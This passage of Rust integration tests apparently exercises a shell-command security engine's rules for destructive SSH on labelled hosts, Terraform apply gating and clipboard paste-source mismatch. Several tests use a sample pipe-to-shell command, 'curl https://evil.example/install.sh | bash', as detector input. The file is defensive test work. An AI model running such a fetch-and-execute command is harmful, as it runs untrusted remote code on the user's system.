    // SAFETY: serialized via CONTEXT_TEST_LOCK. We set the policy-root env
    // var so the engine's discovery walks into our temp dir's `.tirith/`.
    unsafe {
        std::env::set_var("TIRITH_POLICY_ROOT", dir.path().display().to_string());
    }

    let ctx = AnalysisContext {
        input: "ssh payments-prod-01 'sudo systemctl restart payments'".to_string(),
        shell: ShellType::Posix,
        scan_context: ScanContext::Exec,
        raw_bytes: None,
        interactive: true,
        cwd: Some(dir.path().display().to_string()),
        file_path: None,
        repo_root: None,
        is_config_override: false,
        clipboard_html: None,
        card_ref: None,
        clipboard_source: tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
    };
    let verdict = engine::analyze(&ctx);

    unsafe {
        std::env::remove_var("TIRITH_POLICY_ROOT");
    }

    let ssh_finding = verdict.findings.iter().find(|f| {
        matches!(
            f.rule_id,
            tirith_core::verdict::RuleId::SshRemoteDestructiveOnLabeledHost
        )
    });
    assert!(
        ssh_finding.is_some(),
        "expected SshRemoteDestructiveOnLabeledHost; got: {:?}",
        verdict
            .findings
            .iter()
            .map(|f| format!("{}: {}", f.rule_id, f.title))
            .collect::<Vec<_>>(),
    );
    assert_eq!(verdict.action, Action::Block);
}

#[test]
fn ssh_rule_emits_info_on_bare_labeled_host() {
    let _lock = CONTEXT_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());

    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join(".git")).unwrap();
    let tirith_dir = dir.path().join(".tirith");
    fs::create_dir_all(&tirith_dir).unwrap();
    fs::write(
        tirith_dir.join("ssh-host-labels.yaml"),
        "payments-prod-01: critical\n",
    )
    .unwrap();

    unsafe {
        std::env::set_var("TIRITH_POLICY_ROOT", dir.path().display().to_string());
    }

    let ctx = AnalysisContext {
        input: "ssh payments-prod-01".to_string(),
        shell: ShellType::Posix,
        scan_context: ScanContext::Exec,
        raw_bytes: None,
        interactive: true,
        cwd: Some(dir.path().display().to_string()),
        file_path: None,
        repo_root: None,
        is_config_override: false,
        clipboard_html: None,
        card_ref: None,
        clipboard_source: tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
    };
    let verdict = engine::analyze(&ctx);

    unsafe {
        std::env::remove_var("TIRITH_POLICY_ROOT");
    }

    let info_finding = verdict.findings.iter().find(|f| {
        matches!(
            f.rule_id,
            tirith_core::verdict::RuleId::SshRemoteShellOnLabeledHost
        )
    });
    assert!(
        info_finding.is_some(),
        "expected SshRemoteShellOnLabeledHost; got: {:?}",
        verdict
            .findings
            .iter()
            .map(|f| format!("{}: {}", f.rule_id, f.title))
            .collect::<Vec<_>>(),
    );
    // Info severity maps to Allow.
    assert_eq!(verdict.action, Action::Allow);
}

#[test]
fn ssh_rule_allows_unlabeled_host_with_destructive_inner() {
    let _lock = CONTEXT_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());

    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join(".git")).unwrap();
    let tirith_dir = dir.path().join(".tirith");
    fs::create_dir_all(&tirith_dir).unwrap();
    fs::write(
        tirith_dir.join("ssh-host-labels.yaml"),
        "payments-prod-01: critical\n",
    )
    .unwrap();

    unsafe {
        std::env::set_var("TIRITH_POLICY_ROOT", dir.path().display().to_string());
    }

    // Different host name — not in the labels file.
    let ctx = AnalysisContext {
        input: "ssh dev-host 'sudo systemctl restart x'".to_string(),
        shell: ShellType::Posix,
        scan_context: ScanContext::Exec,
        raw_bytes: None,
        interactive: true,
        cwd: Some(dir.path().display().to_string()),
        file_path: None,
        repo_root: None,
        is_config_override: false,
        clipboard_html: None,
        card_ref: None,
        clipboard_source: tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
    };
    let verdict = engine::analyze(&ctx);

    unsafe {
        std::env::remove_var("TIRITH_POLICY_ROOT");
    }

    let ssh_findings: Vec<_> = verdict
        .findings
        .iter()
        .filter(|f| {
            matches!(
                f.rule_id,
                tirith_core::verdict::RuleId::SshRemoteDestructiveOnLabeledHost
                    | tirith_core::verdict::RuleId::SshRemoteShellOnLabeledHost
            )
        })
        .collect();
    assert!(
        ssh_findings.is_empty(),
        "unlabeled host must NOT fire any SSH rule; got: {:?}",
        ssh_findings
            .iter()
            .map(|f| f.rule_id.to_string())
            .collect::<Vec<_>>()
    );
}

// M8 ch3 — IaC apply-gate integration tests. Inject a temp `state_dir()` via
// `XDG_STATE_HOME` so the plan-hash store is test-scoped, then exercise
// `IacApplyWithoutPlan` / `IacPlanHashMismatch`. Share `CONTEXT_TEST_LOCK`.

#[test]
fn iac_rule_blocks_apply_without_plan_when_policy_on() {
    let _lock = CONTEXT_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());

    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join(".git")).unwrap();
    let tirith_dir = dir.path().join(".tirith");
    fs::create_dir_all(&tirith_dir).unwrap();
    fs::write(
        tirith_dir.join("policy.yaml"),
        "iac_require_plan_before_apply: true\n",
    )
    .unwrap();

    unsafe {
        std::env::set_var("TIRITH_POLICY_ROOT", dir.path().display().to_string());
    }

    let ctx = AnalysisContext {
        input: "terraform apply".to_string(),
        shell: ShellType::Posix,
        scan_context: ScanContext::Exec,
        raw_bytes: None,
        interactive: true,
        cwd: Some(dir.path().display().to_string()),
        file_path: None,
        repo_root: None,
        is_config_override: false,
        clipboard_html: None,
        card_ref: None,
        clipboard_source: tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
    };
    let verdict = engine::analyze(&ctx);

    unsafe {
        std::env::remove_var("TIRITH_POLICY_ROOT");
    }

    let iac_finding = verdict
        .findings
        .iter()
        .find(|f| matches!(f.rule_id, tirith_core::verdict::RuleId::IacApplyWithoutPlan));
    assert!(
        iac_finding.is_some(),
        "expected IacApplyWithoutPlan finding; got: {:?}",
        verdict
            .findings
            .iter()
            .map(|f| format!("{}: {}", f.rule_id, f.title))
            .collect::<Vec<_>>(),
    );
    assert_eq!(verdict.action, Action::Block);
}

#[test]
fn iac_rule_blocks_plan_hash_mismatch_when_policy_on() {
    let _lock = CONTEXT_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());

    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join(".git")).unwrap();
    let tirith_dir = dir.path().join(".tirith");
    fs::create_dir_all(&tirith_dir).unwrap();
    fs::write(
        tirith_dir.join("policy.yaml"),
        "iac_require_plan_before_apply: true\n",
    )
    .unwrap();

    // A plan file with no recorded hash (we never call `record_plan_hash` here).
    let plan_path = dir.path().join("tfplan");
    fs::write(&plan_path, b"NOT A REAL TF PLAN BUT NOT EMPTY").unwrap();

    // Temp XDG_STATE_HOME so this can't match a real recorded hash on the dev machine.
    let state_dir = dir.path().join("state");
    fs::create_dir_all(&state_dir).unwrap();
    let prev_xdg = std::env::var_os("XDG_STATE_HOME");

    unsafe {
        std::env::set_var("TIRITH_POLICY_ROOT", dir.path().display().to_string());
        std::env::set_var("XDG_STATE_HOME", state_dir.display().to_string());
    }

    let ctx = AnalysisContext {
        input: format!("terraform apply {}", plan_path.display()),
        shell: ShellType::Posix,
        scan_context: ScanContext::Exec,
        raw_bytes: None,
        interactive: true,
        cwd: Some(dir.path().display().to_string()),
        file_path: None,
        repo_root: None,
        is_config_override: false,
        clipboard_html: None,
        card_ref: None,
        clipboard_source: tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
    };
    let verdict = engine::analyze(&ctx);

    unsafe {
        std::env::remove_var("TIRITH_POLICY_ROOT");
        match prev_xdg {
            Some(v) => std::env::set_var("XDG_STATE_HOME", v),
            None => std::env::remove_var("XDG_STATE_HOME"),
        }
    }

    let mismatch_finding = verdict
        .findings
        .iter()
        .find(|f| matches!(f.rule_id, tirith_core::verdict::RuleId::IacPlanHashMismatch));
    assert!(
        mismatch_finding.is_some(),
        "expected IacPlanHashMismatch finding; got: {:?}",
        verdict
            .findings
            .iter()
            .map(|f| format!("{}: {}", f.rule_id, f.title))
            .collect::<Vec<_>>(),
    );
}

/// Regression (PR-127 #4): pin the full lifecycle — record hash, confirm no
/// mismatch on the unchanged file, modify it, confirm the mismatch then fires.
#[test]
fn iac_rule_detects_plan_modification_after_record() {
    use tirith_core::iac_plan::{self, PlanSummary};

    let _lock = CONTEXT_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());

    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join(".git")).unwrap();
    let tirith_dir = dir.path().join(".tirith");
    fs::create_dir_all(&tirith_dir).unwrap();
    fs::write(
        tirith_dir.join("policy.yaml"),
        "iac_require_plan_before_apply: true\n",
    )
    .unwrap();

    let plan_path = dir.path().join("tfplan");
    let original_bytes = b"ORIGINAL PLAN CONTENT";
    fs::write(&plan_path, original_bytes).unwrap();

    let state_dir = dir.path().join("state");
    fs::create_dir_all(&state_dir).unwrap();
    let prev_xdg = std::env::var_os("XDG_STATE_HOME");
    let prev_policy_root = std::env::var_os("TIRITH_POLICY_ROOT");

    unsafe {
        std::env::set_var("TIRITH_POLICY_ROOT", dir.path().display().to_string());
        std::env::set_var("XDG_STATE_HOME", state_dir.display().to_string());
    }

    // (a) Record the hash of the ORIGINAL file content.
    let summary = PlanSummary::default();
    iac_plan::record_plan_hash(original_bytes, &plan_path, &summary)
        .expect("record_plan_hash should succeed");

    let analyze = |input: &str| {
        let ctx = AnalysisContext {
            input: input.to_string(),
            shell: ShellType::Posix,
            scan_context: ScanContext::Exec,
            raw_bytes: None,
            interactive: true,
            cwd: Some(dir.path().display().to_string()),
            file_path: None,
            repo_root: None,
            is_config_override: false,
            clipboard_html: None,
            card_ref: None,
            clipboard_source: tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
        };
        engine::analyze(&ctx)
    };

    // (b) Unchanged file → no mismatch.
    let v_unchanged = analyze(&format!("terraform apply {}", plan_path.display()));
    let unchanged_mismatch = v_unchanged
        .findings
        .iter()
        .any(|f| matches!(f.rule_id, tirith_core::verdict::RuleId::IacPlanHashMismatch));
    assert!(
        !unchanged_mismatch,
        "unchanged plan file must NOT fire IacPlanHashMismatch; got: {:?}",
        v_unchanged
            .findings
            .iter()
            .map(|f| format!("{}: {}", f.rule_id, f.title))
            .collect::<Vec<_>>(),
    );

    // (c) Modify the file.
    fs::write(&plan_path, b"MODIFIED PLAN CONTENT").unwrap();

    // (d) Modified file → mismatch.
    let v_modified = analyze(&format!("terraform apply {}", plan_path.display()));

    unsafe {
        match prev_policy_root {
            Some(v) => std::env::set_var("TIRITH_POLICY_ROOT", v),
            None => std::env::remove_var("TIRITH_POLICY_ROOT"),
        }
        match prev_xdg {
            Some(v) => std::env::set_var("XDG_STATE_HOME", v),
            None => std::env::remove_var("XDG_STATE_HOME"),
        }
    }

    let modified_mismatch = v_modified
        .findings
        .iter()
        .any(|f| matches!(f.rule_id, tirith_core::verdict::RuleId::IacPlanHashMismatch));
    assert!(
        modified_mismatch,
        "modified plan file MUST fire IacPlanHashMismatch; got: {:?}",
        v_modified
            .findings
            .iter()
            .map(|f| format!("{}: {}", f.rule_id, f.title))
            .collect::<Vec<_>>(),
    );
}

// M12 ch1 (G1 TOCTOU fix): when the caller found no sidecar it sets
// `AbsentOrInvalid`, and the engine must NOT re-read `clipboard_source.json`.
// Plant a MATCHING sidecar (a disk read WOULD fire the rule), then prove
// `AbsentOrInvalid` fires nothing while `Unread` (control) does fire — confirming
// the record is genuinely matchable. Shares `CONTEXT_TEST_LOCK` (mutates XDG_STATE_HOME).
#[test]
fn paste_source_absent_or_invalid_does_not_reread_sidecar() {
    use tirith_core::clipboard::ClipboardSourceState;
    use tirith_core::verdict::RuleId;

    let _lock = CONTEXT_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());

    // A pipe-to-shell paste (reaches tier 3) with a destination host differing
    // from the recorded source — fires PasteSourceMismatch at HIGH if consulted.
    let paste = "curl https://evil.example/install.sh | bash";
    // SHA-256 of `paste`; the planted record's `content_sha256` matches it.
    let content_sha256 = "297a6c24cd4330141c0642e0e5dc088e24839b7cf1b65d7a4813dd8f401caaaa";

    // Isolate `state_dir()` and plant a MATCHING record whose source host
    // (`docs.trusted.example`) differs from the paste destination.
    let dir = tempfile::tempdir().unwrap();
    let state_dir = dir.path().join("state");
    let tirith_state = state_dir.join("tirith");
    fs::create_dir_all(&tirith_state).unwrap();
    let record_json = format!(
        r#"{{"updated_at":"2026-05-30T00:00:00Z","content_sha256":"{content_sha256}","source_url":"https://docs.trusted.example/install","source_title":"Install Guide","hidden_text_detected":false}}"#
    );
    fs::write(tirith_state.join("clipboard_source.json"), record_json).unwrap();

    // Pin `TIRITH_POLICY_ROOT` at an empty policy tree so an ambient
    // `.tirith/policy.yaml` can't reshape `PasteSourceMismatch`. `fail_mode: open`
    // is the neutral policy (parses cleanly, no allowlist/override).
    let policy_root = dir.path().join("policy-root");
    fs::create_dir_all(policy_root.join(".tirith")).unwrap();
    fs::write(policy_root.join(".tirith/policy.yaml"), "fail_mode: open\n").unwrap();

    let prev_xdg = std::env::var_os("XDG_STATE_HOME");
    let prev_policy_root = std::env::var_os("TIRITH_POLICY_ROOT");
    unsafe {
        std::env::set_var("XDG_STATE_HOME", state_dir.display().to_string());
        std::env::set_var("TIRITH_POLICY_ROOT", policy_root.display().to_string());
    }

    // Build a Paste context with the given tri-state (raw_bytes as the real path).
    let analyze_paste = |state: ClipboardSourceState| {
        let ctx = AnalysisContext {
            input: paste.to_string(),
            shell: ShellType::Posix,
            scan_context: ScanContext::Paste,
            raw_bytes: Some(paste.as_bytes().to_vec()),
            interactive: false,
            cwd: None,
            file_path: None,
            repo_root: None,
            is_config_override: false,
            clipboard_html: None,
            card_ref: None,
            clipboard_source: state,
        };
        engine::analyze(&ctx)
    };

    let absent = analyze_paste(ClipboardSourceState::AbsentOrInvalid);
    // Positive control: the SAME on-disk record IS matchable via the read path.
    let unread = analyze_paste(ClipboardSourceState::Unread);

    unsafe {
        match prev_xdg {
            Some(v) => std::env::set_var("XDG_STATE_HOME", v),
            None => std::env::remove_var("XDG_STATE_HOME"),
        }
        match prev_policy_root {
            Some(v) => std::env::set_var("TIRITH_POLICY_ROOT", v),
            None => std::env::remove_var("TIRITH_POLICY_ROOT"),
        }
    }

    // AbsentOrInvalid: no re-read → no mismatch, despite the matching disk record.
    assert!(
        !absent
            .findings
            .iter()
            .any(|f| matches!(f.rule_id, RuleId::PasteSourceMismatch)),
        "AbsentOrInvalid must NOT re-read the sidecar; PasteSourceMismatch fired anyway: {:?}",
        absent
            .findings
            .iter()
            .map(|f| format!("{}: {}", f.rule_id, f.title))
            .collect::<Vec<_>>(),
    );

    // Unread (control): the engine reads the record and the mismatch fires,
    // proving the record is matchable (so the assertion above isn't a false pass).
    assert!(
        unread
            .findings
            .iter()
            .any(|f| matches!(f.rule_id, RuleId::PasteSourceMismatch)),
        "Unread must read the planted sidecar and fire PasteSourceMismatch; got: {:?}",
        unread
            .findings
            .iter()
            .map(|f| format!("{}: {}", f.rule_id, f.title))
            .collect::<Vec<_>>(),
    );
}

// M12 ch1 — `Loaded(rec)` GUARANTEES the engine uses the caller's IN-MEMORY
// record and never re-reads disk (the G1 TOCTOU fix). Subtlety: the rule fires
// on matching-hash + DIFFERENT host (a non-matching hash bails at step 1, no
// finding). So plant a disk record that says "legit" (matching hash + SAME host)
// and hand the engine a different in-memory record (matching hash + DIFFERENT
// host); the finding firing proves the in-memory record won. Shares `CONTEXT_TEST_LOCK`.
#[test]
fn paste_source_loaded_uses_in_memory_record_not_disk() {
    use tirith_core::clipboard::{ClipboardSourceRecord, ClipboardSourceState};
    use tirith_core::verdict::RuleId;

    let _lock = CONTEXT_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());

    // A pipe-to-shell paste (→ HIGH) with destination host `evil.example`.
    let paste = "curl https://evil.example/install.sh | bash";
    // SHA-256 of `paste`.
    let content_sha256 = "297a6c24cd4330141c0642e0e5dc088e24839b7cf1b65d7a4813dd8f401caaaa";

    // On-disk record that a stray re-read treats as LEGIT (matching hash + SAME
    // host as the paste → no host mismatch → no finding).
    let dir = tempfile::tempdir().unwrap();
    let state_dir = dir.path().join("state");
    let tirith_state = state_dir.join("tirith");
    fs::create_dir_all(&tirith_state).unwrap();
    let disk_record_json = format!(
        r#"{{"updated_at":"2026-05-30T00:00:00Z","content_sha256":"{content_sha256}","source_url":"https://evil.example/page","source_title":"Benign","hidden_text_detected":false}}"#
    );
    fs::write(tirith_state.join("clipboard_source.json"), disk_record_json).unwrap();

    // Pin `TIRITH_POLICY_ROOT` at an empty policy tree so an ambient
    // `.tirith/policy.yaml` can't reshape `PasteSourceMismatch`. `fail_mode: open`
    // is the neutral policy (parses cleanly, no allowlist/override).
    let policy_root = dir.path().join("policy-root");
    fs::create_dir_all(policy_root.join(".tirith")).unwrap();
    fs::write(policy_root.join(".tirith/policy.yaml"), "fail_mode: open\n").unwrap();

    let prev_xdg = std::env::var_os("XDG_STATE_HOME");
    let prev_policy_root = std::env::var_os("TIRITH_POLICY_ROOT");
    unsafe {
        std::env::set_var("XDG_STATE_HOME", state_dir.display().to_string());
        std::env::set_var("TIRITH_POLICY_ROOT", policy_root.display().to_string());
    }

    // In-memory record: matching hash (attribution proceeds) + DIFFERENT host
    // (`docs.trusted.example`) → host mismatch → finding.
    let in_memory = ClipboardSourceRecord {
        updated_at: "2026-05-30T00:00:00Z".to_string(),
        content_sha256: content_sha256.to_string(),
        source_url: "https://docs.trusted.example/install".to_string(),
        source_title: "Install Guide".to_string(),
        hidden_text_detected: false,
    };

    let analyze_paste = |state: ClipboardSourceState| {
        let ctx = AnalysisContext {
            input: paste.to_string(),
            shell: ShellType::Posix,
            scan_context: ScanContext::Paste,
            raw_bytes: Some(paste.as_bytes().to_vec()),
            interactive: false,
            cwd: None,
            file_path: None,
            repo_root: None,
            is_config_override: false,
            clipboard_html: None,
            card_ref: None,
            clipboard_source: state,
        };
        engine::analyze(&ctx)
    };

    let loaded = analyze_paste(ClipboardSourceState::Loaded(in_memory));
    // Control: with no tri-state record, the engine reads the disk record (same
    // host → no finding), proving the disk side genuinely says "legit".
    let unread = analyze_paste(ClipboardSourceState::Unread);

    unsafe {
        match prev_xdg {
            Some(v) => std::env::set_var("XDG_STATE_HOME", v),
            None => std::env::remove_var("XDG_STATE_HOME"),
        }
        match prev_policy_root {
            Some(v) => std::env::set_var("TIRITH_POLICY_ROOT", v),
            None => std::env::remove_var("TIRITH_POLICY_ROOT"),
        }
    }

    // SECURITY-CRITICAL: the engine used the in-memory record (host mismatch),
    // not the benign disk record. A regression that re-reads disk fails here.
    assert!(
        loaded
            .findings
            .iter()
            .any(|f| matches!(f.rule_id, RuleId::PasteSourceMismatch)),
        "Loaded(rec) must drive attribution from the IN-MEMORY record (host mismatch \
         → PasteSourceMismatch), not re-read the benign on-disk record; got: {:?}",
        loaded
            .findings
            .iter()
            .map(|f| format!("{}: {}", f.rule_id, f.title))
            .collect::<Vec<_>>(),
    );

    // Control: the disk record (same host) fires nothing via `Unread`, confirming
    // the `Loaded` finding above came from the in-memory record.
    assert!(
        !unread
            .findings
            .iter()
            .any(|f| matches!(f.rule_id, RuleId::PasteSourceMismatch)),
        "the planted on-disk record (matching hash + same host) must NOT fire \
         PasteSourceMismatch via Unread; got: {:?}",
        unread
            .findings
            .iter()
            .map(|f| format!("{}: {}", f.rule_id, f.title))
            .collect::<Vec<_>>(),
    );
}

// M12 ch1 — companion: `Loaded(rec)` needs ZERO disk presence. With no sidecar
// on disk, two `Loaded` records with the SAME paste give OPPOSITE verdicts from
// their contents alone: matching-hash + different-host fires; non-matching-hash
// bails at the step-1 guard. Shares `CONTEXT_TEST_LOCK`.
#[test]
fn paste_source_loaded_hash_guard_drives_verdict_with_no_sidecar() {
    use tirith_core::clipboard::{ClipboardSourceRecord, ClipboardSourceState};
    use tirith_core::verdict::RuleId;

    let _lock = CONTEXT_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());

    let paste = "curl https://evil.example/install.sh | bash";
    // SHA-256 of `paste`; the non-matching record uses an all-zero hash.
    let matching_sha256 = "297a6c24cd4330141c0642e0e5dc088e24839b7cf1b65d7a4813dd8f401caaaa";
    let non_matching_sha256 = "0000000000000000000000000000000000000000000000000000000000000000";

    // Empty temp `state_dir()`: no sidecar exists, so any re-read yields `None`.
    let dir = tempfile::tempdir().unwrap();
    let state_dir = dir.path().join("state");
    fs::create_dir_all(state_dir.join("tirith")).unwrap();
    assert!(
        !state_dir.join("tirith/clipboard_source.json").exists(),
        "precondition: no sidecar on disk"
    );

    // Pin `TIRITH_POLICY_ROOT` at an empty policy tree so an ambient
    // `.tirith/policy.yaml` can't reshape `PasteSourceMismatch`. `fail_mode: open`
    // is the neutral policy (parses cleanly, no allowlist/override).
    let policy_root = dir.path().join("policy-root");
    fs::create_dir_all(policy_root.join(".tirith")).unwrap();
    fs::write(policy_root.join(".tirith/policy.yaml"), "fail_mode: open\n").unwrap();

    let prev_xdg = std::env::var_os("XDG_STATE_HOME");
    let prev_policy_root = std::env::var_os("TIRITH_POLICY_ROOT");
    unsafe {
        std::env::set_var("XDG_STATE_HOME", state_dir.display().to_string());
        std::env::set_var("TIRITH_POLICY_ROOT", policy_root.display().to_string());
    }

    let analyze_paste = |state: ClipboardSourceState| {
        let ctx = AnalysisContext {
            input: paste.to_string(),
            shell: ShellType::Posix,
            scan_context: ScanContext::Paste,
            raw_bytes: Some(paste.as_bytes().to_vec()),
            interactive: false,
            cwd: None,
            file_path: None,
            repo_root: None,
            is_config_override: false,
            clipboard_html: None,
            card_ref: None,
            clipboard_source: state,
        };
        engine::analyze(&ctx)
    };

    // (1) Matching hash + DIFFERENT host → attribution proceeds, host mismatch.
    let matching_diff_host = ClipboardSourceRecord {
        updated_at: "2026-05-30T00:00:00Z".to_string(),
        content_sha256: matching_sha256.to_string(),
        source_url: "https://docs.trusted.example/install".to_string(),
        source_title: String::new(),
        hidden_text_detected: false,
    };
    let fires = analyze_paste(ClipboardSourceState::Loaded(matching_diff_host));

    // (2) NON-matching hash → rule's step-1 guard bails, NO attribution.
    let non_matching = ClipboardSourceRecord {
        updated_at: "2026-05-30T00:00:00Z".to_string(),
        content_sha256: non_matching_sha256.to_string(),
        source_url: "https://docs.trusted.example/install".to_string(),
        source_title: String::new(),
        hidden_text_detected: false,
    };
    let suppressed = analyze_paste(ClipboardSourceState::Loaded(non_matching));

    unsafe {
        match prev_xdg {
            Some(v) => std::env::set_var("XDG_STATE_HOME", v),
            None => std::env::remove_var("XDG_STATE_HOME"),
        }
        match prev_policy_root {
            Some(v) => std::env::set_var("TIRITH_POLICY_ROOT", v),
            None => std::env::remove_var("TIRITH_POLICY_ROOT"),
        }
    }

    // With no disk presence, the matching-hash + different-host record alone fires.
    assert!(
        fires
            .findings
            .iter()
            .any(|f| matches!(f.rule_id, RuleId::PasteSourceMismatch)),
        "a Loaded record (matching hash + different host) must fire PasteSourceMismatch \
         from memory alone, with no sidecar on disk; got: {:?}",
        fires
            .findings
            .iter()
            .map(|f| format!("{}: {}", f.rule_id, f.title))
            .collect::<Vec<_>>(),
    );

    // And a non-matching-hash record is suppressed by the content-hash guard.
    assert!(
        !suppressed
            .findings
            .iter()
            .any(|f| matches!(f.rule_id, RuleId::PasteSourceMismatch)),
        "a Loaded record whose content hash does NOT match the paste must be suppressed \
         (no attribution); got: {:?}",
        suppressed
            .findings
            .iter()
            .map(|f| format!("{}: {}", f.rule_id, f.title))
            .collect::<Vec<_>>(),
    );
}
